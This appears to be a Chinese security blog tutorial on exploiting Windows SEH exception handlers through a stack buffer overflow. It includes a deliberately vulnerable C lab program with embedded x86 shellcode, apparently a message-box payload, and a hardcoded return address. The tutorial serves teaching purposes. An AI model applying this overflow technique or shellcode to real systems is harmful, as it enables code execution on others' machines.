> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ylnTR_sxqN0jH8Wt68Qmrg)

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

文章介绍

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

 **本文利用 SEH 异常结构体，通过溢出实现执行 shellcode**

1.SEH 简介  

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

**这里直接看如下图即可。**  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJHlht79M6l4WRtYkIp0X7udRD4dPykPiaotdJw7RgAdexEYh7iamKiacaQ/640?wx_fmt=png)

    看完如上 SEH 介绍之后，接下来简单说一下 SEH 溢出

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJYVXvEicBUkwiartCjKWQuYEEfS3yJLE6v7rLrjeibN9u6kQvPFfBOY87g/640?wx_fmt=png)

2. 通过栈溢出利用 SEH

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

    首先看一下下方代码, 其实漏洞点还在 strcpy 函数，将 shellcode 拷贝到 buf，后续    zero=zero/0; 肯定是会触发异常，而__except 肯定是会去处理异常。

这里处理异常的话，寻找的是最近的 SEH。

```
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x98\xFE\x12\x00"; 
void exp(){
printf("error");
getchar();
ExitProcess(1);
}
void test(char* input){
  printf("111");
  __asm int 3;
  char buf[200];
  int zero=0;
  __try{
    strcpy(buf,input);
    zero = 4/zero;
  }
  __except(exp()){
  
  }
}
int main(int argc, char* argv[])
{
  printf("%d",sizeof(shellcode));
  test(shellcode);
  return 0;
}
```

3.OD 分析  

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

当执行完 strcpy 后，看一下堆栈情况, E0 处就是 shellcode 的起始位置了，因为 shellcode 肯定是不足 200 个字节的，所以用 90 填充。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJJuEPfT4kvH9x007bsd6Pokyx4hNImhmjwgZ5J5UEc6UgzbnNStdRfw/640?wx_fmt=png)

    继续看 SEH 的位置，SEH 就在 EBP 附近，所以将其改为 (12FE98)shellcode 地址即可。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJ8KmYNGDPpUdkYxTThHQl3ZPAL7bbksicgHn03UeX6hR3uZcl13tKiaFA/640?wx_fmt=png)

4. 运行成功

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJ8ZrOyypUIJ8YVHLYNjQzkzHz2L3ouDagDVxyqibQEHJcyxbfH2LoMAw/640?wx_fmt=png)

关注公众号吧~~ 下方扫一扫

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

微信关注 “安全族”，长期致力于安全研究

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywiaJCkziaQLQSQrBa9qJFWQJzrIOpB7giayjMZrEkX7viaFTLRwGnsRUDcoS9jgnDUtiakRODpzeVTBZQ/640?wx_fmt=jpeg)